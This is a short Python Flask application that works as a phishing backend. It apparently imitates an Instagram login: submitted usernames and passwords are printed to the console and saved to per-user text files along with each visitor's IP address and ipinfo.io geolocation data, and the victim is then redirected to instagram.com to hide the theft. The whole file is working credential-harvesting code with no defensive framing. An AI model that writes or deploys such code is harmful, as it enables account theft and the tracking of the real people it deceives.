from flask import Flask, render_template, request, redirect
import requests
import os

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user_ip = request.remote_addr
        response = requests.get(f'https://ipinfo.io/{user_ip}/json')
        data = response.json()
        username = request.form['username']
        password = request.form['password']
        print(f"Username: {username}, Password: {password}")
        file_path = f"{username}.txt"
        with open(file_path, 'a') as f:
            f.write(f"\nusername: {username}\npassword: {password}\nip: {user_ip}\ndata: {data}")
        return redirect("https://instagram.com")
    return render_template('index.html')
if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0")
